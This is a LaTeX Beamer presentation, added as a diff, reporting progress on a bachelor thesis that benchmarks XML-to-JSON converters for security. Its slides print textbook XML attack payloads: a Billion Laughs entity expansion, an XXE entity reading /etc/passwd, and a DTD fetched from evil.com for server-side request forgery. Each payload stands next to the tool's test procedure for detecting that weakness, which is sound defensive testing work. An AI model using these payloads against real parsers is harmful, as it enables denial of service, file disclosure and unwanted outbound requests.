@@ -1,0 +1,200 @@
+\documentclass[
+    alternativetitlepage=alternativ,
+    cornerlogo=hgi_nds_logo2,
+    sectionoverview,
+]{rubpresentation}
+\setbeamercovered{invisible}
+
+\title[XML/JSON conversions]
+{Bridging the Gap: Secure and lossless conversion\\ of XML data structures to the JSON format}
+\subtitle{\small Bachelor thesis \hspace{3mm}{\scriptsize $\blacksquare$}\hspace{3mm} March 30, 2017 -- June 29, 2017}
+
+\author[Holthuis]{Jan~Holthuis}
+
+\institute[Advisors]
+{%\inst{1}%
+Advisors: Dennis Felsch \& Paul Rösler
+}
+\date{April 25, 2017}
+\subject{Computer Science}
+
+\titlegraphic{titlepage.png}
+\sponsorlogo[height=7.6mm,interpolate=true]{hgi_nds_logo}
+
+\begin{document}
+
+\frame[plain]{\titlepage}
+
+%\begin{frame}{The \texttt{\textbackslash note}-Macro}
+%\begin{itemize}[<+->]
+%\item normal text for the presentation.
+%\note<1-2>[item]{Say something to the audience!}
+%\item and text for the presentation.
+%\item foo
+%\end{itemize}
+%\note<2>{Another note for you!}
+%\end{frame}
+
+%\note[enumerate]{\item foo \item bar \item baz \item foobar}
+
+
+\section{Quick Recap}
+
+\begin{frame}
+    \frametitle{Last time we learned that...}
+    \framesubtitle{}
+    \begin{itemize}
+        \item{} XML and JSON are very popular formats in many areas (Web APIs in particular)
+        \item{} Support varies by programming language, framework, etc.
+        \item{} Lossless conversion of arbitrary to JSON isn't trivial
+        \item{} There are plenty of converters available... but how good are they?
+        \item{} I started to implement a tool to benchmark existing solutions
+    \end{itemize}
+
+\end{frame}
+
+
+\section{Progress report}
+
+\begin{frame}
+    \frametitle{Progress made in the last two weeks}
+    \framesubtitle{\texttt{xjcc} Tool Development}
+    \begin{itemize}
+        \item{} Added concurrency (threading) for faster tests
+        \item{} Tool now checks if resulting JSON is erroneous
+        \begin{itemize}
+            \item{} Using JSON linting of the \texttt{demjson} library
+        \end{itemize}
+        \item{} Implemented groundwork for XML attacks (more on next slides)
+    \end{itemize}
+\end{frame}
+
+\section{XML Attacks}
+
+\begin{frame}
+    \frametitle{XML Attacks}
+    \begin{itemize}
+        \item{} Fall in these basic categories:
+        \begin{itemize}
+            \item{} Denial of Service (Billion Laughs, Quadratic Blowup)
+            \item{} File System Access (XXE, XInclude, ...)
+            \item{} Server-Side Request Forgery (DTD Retrieval, Schema Location, etc.)
+        \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Denial of Service}
+    \begin{columns}[t]
+        \begin{column}{0.5\textwidth}
+            \begin{lstlisting}[language=xml,basicstyle=\fontsize{8.5}{11}\ttfamily,numbers=none]
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY a "lol">
+  <!ENTITY a1 "&a;&a;[...]&a;&a;">
+  <!ENTITY a2 "&a1;&a1;[...]&a1;&a1;">
+  <!-- [...] -->
+  <!ENTITY a9 "&a8;&a8;[...]&a8;&a8;">
+]>
+<data>&a9;</data>
+            \end{lstlisting}
+        \end{column}
+        \begin{column}{0.5\textwidth}
+            \begin{enumerate}
+                \item{} Run test as a separate process (\texttt{fork()})
+                \item{} Set max CPU and memory usage via Linux' \texttt{rlimit}
+                \item{} Run converter
+                \item{} Check if process has been killed by the kernel
+            \end{enumerate}
+        \end{column}
+    \end{columns}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{File System Access}
+    \begin{columns}[t]
+        \begin{column}{0.5\textwidth}
+            \begin{lstlisting}[language=xml,basicstyle=\fontsize{8.5}{11}\ttfamily,numbers=none]
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ELEMENT data ANY >
+  <!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+            \end{lstlisting}
+        \end{column}
+        \begin{column}{0.5\textwidth}
+            \begin{enumerate}
+                \item{} Create test files that contain certain string
+                \item{} Run converter
+                \item{} Check if string is present in resulting file
+            \end{enumerate}
+        \end{column}
+    \end{columns}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Server-Side Request Forgery}
+    \begin{columns}[t]
+        \begin{column}{0.5\textwidth}
+            \begin{lstlisting}[language=xml,basicstyle=\fontsize{8.5}{11}\ttfamily,numbers=none]
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://evil.com/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+    <head />
+    <body>text</body>
+</html>
+            \end{lstlisting}
+        \end{column}
+        \begin{column}{0.5\textwidth}
+            \begin{enumerate}
+                \item{} Start a webserver in a background thread
+                \item{} Run converter
+                \item{} Check if webserver received any HTTP requests
+            \end{enumerate}
+        \end{column}
+    \end{columns}
+\end{frame}
+
+\section{Next steps}
+
+\begin{frame}
+    \frametitle{Next Steps}
+    \begin{itemize}
+        \item{} Research and establish conversion criteria
+        \item{} Create test documents
+        \item{} Evaluate current solutions using the test documents
+        \item{} Possibly develop custom algorithm
+    \end{itemize}
+\end{frame}
+
+%%% Finally the last slide
+
+\begin{frame}[plain]
+\frametitle{Thanks!}
+ \begin{center}
+ {\bfseries\fontsize{30pt}{1.2em}\selectfont Questions?}
+ \end{center}
+  \begin{columns}
+    \begin{column}{0.5\textwidth}
+      \begin{center}
+        %\font\endfont = cmss10 at 25.40mm
+        %\color{Brown}
+        %\endfont
+        %\baselineskip 20.0mm
+        Reach out via email:
+        \begin{itemize}
+        \item \textbf{Jan Holthuis}\\
+              jan.holthuis@rub.de
+        \end{itemize}
+      \end{center}
+    \end{column}
+    \begin{column}{0.5\textwidth}
+      \begin{center}
+        \pgfimage[width=\textwidth]{questions.jpg}
+      \end{center}
+    \end{column}
+  \end{columns}
+\end{frame}
+
+\end{document}
